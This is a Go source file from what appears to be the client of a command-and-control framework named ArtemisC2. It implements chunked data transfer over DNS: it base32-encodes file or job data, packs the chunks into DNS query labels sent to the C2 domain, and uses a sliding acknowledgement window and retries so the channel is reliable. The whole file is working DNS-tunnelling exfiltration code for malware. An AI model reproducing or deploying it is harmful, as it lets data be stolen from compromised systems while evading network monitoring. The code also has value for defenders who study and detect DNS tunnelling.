package chunkedtransfer

import (
	"encoding/binary"
	"io"
	"math"
	"strconv"
	"strings"
	"time"

	"github.com/desertcod98/ArtemisC2Client/dns"
	"github.com/desertcod98/ArtemisC2Client/encoding"
	"github.com/desertcod98/ArtemisC2Client/utils"
)

const (
	jobIdLength = 5
	windowSize  = 32
)

var (
	maxCharacters = int(math.Floor(
		(float64(255-jobIdLength-len(dns.DomainName)-8) / 64.0) * 63,
	))

	chunkSize  = (maxCharacters * 5) / 8 //base32 encoding
	timeout, _ = time.ParseDuration("6300ms")
)

type Transfer struct {
	JobId       string
	Reader      io.ReaderAt
	TotalBytes  uint64
	TotalChunks int
	baseSeq     uint32
	nextSeq     uint32
}

func NewTransfer(jobId string, reader io.ReaderAt, totalBytes uint64) Transfer {
	totalChunks := int((totalBytes + uint64(chunkSize) - 1) / uint64(chunkSize))
	return Transfer{
		JobId:       jobId,
		Reader:      reader,
		TotalBytes:  totalBytes,
		TotalChunks: int(totalChunks),
	}
}

func (t *Transfer) Send() string {
	sendInitialData(t)

	ackChan := make(chan uint32, windowSize)
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	for {
		for (t.nextSeq-t.baseSeq) < windowSize && t.nextSeq < uint32(t.TotalChunks) {
			payloadToSend := getNextPayload(t)
			go func(ackCh chan uint32) {
				res, err := dns.DnsQuery(payloadToSend + "." + t.JobId)
				if err == nil {
					ack, atoiErr := strconv.Atoi(res)
					if atoiErr == nil {
						ackChan <- uint32(ack)
					}
				}
			}(ackChan)

			t.nextSeq++
		}

		select {
		case ack := <-ackChan:
			maxAck := ack

		getMaxAckLoop:
			for {
				select {
				case ack := <-ackChan:
					if ack > maxAck {
						maxAck = ack
					}
				default:
					break getMaxAckLoop
				}
			}
			if maxAck > t.baseSeq {
				t.baseSeq = maxAck
				if t.nextSeq < t.baseSeq {
					t.nextSeq = t.baseSeq
				}

				timer.Reset(timeout)
				if maxAck == uint32(t.TotalChunks-1) {
					return "ok"
				}
			}
		case <-timer.C:
			t.nextSeq = t.baseSeq
			timer.Reset(timeout)
		}
	}
}

func getNextPayload(t *Transfer) string {
	start := int64(t.nextSeq) * int64(chunkSize)
	end := start + int64(chunkSize)
	if end > int64(t.TotalBytes) {
		end = int64(t.TotalBytes)
	}
	length := end - start

	chunk := make([]byte, length)
	t.Reader.ReadAt(chunk, start)
	chunkStr := encoding.Base32Encode(chunk)
	chunkStrArr := utils.SplitStringArrByLength(chunkStr, 63) // DNS labels have max 63 chars each
	utils.ReverseStringArr(chunkStrArr)
	var seqBytes [4]byte
	binary.LittleEndian.PutUint32(seqBytes[:], t.nextSeq)
	chunkStrArr = append(chunkStrArr, encoding.Base32Encode(seqBytes[:]))
	return strings.Join(chunkStrArr, ".")
}

// Keep trying to send the initial data until the reponse is "ok"
func sendInitialData(t *Transfer) {
	for {
		var totalChunkBytes [4]byte
		binary.LittleEndian.PutUint32(totalChunkBytes[:], uint32(t.TotalChunks))
		req := encoding.Base32Encode(totalChunkBytes[:]) + "." +
			encoding.Base32Encode([]byte("totalchunks")) + "." +
			t.JobId
		res, _ := dns.DnsQuery(req)
		if res == "ok" {
			break
		}
	}
}
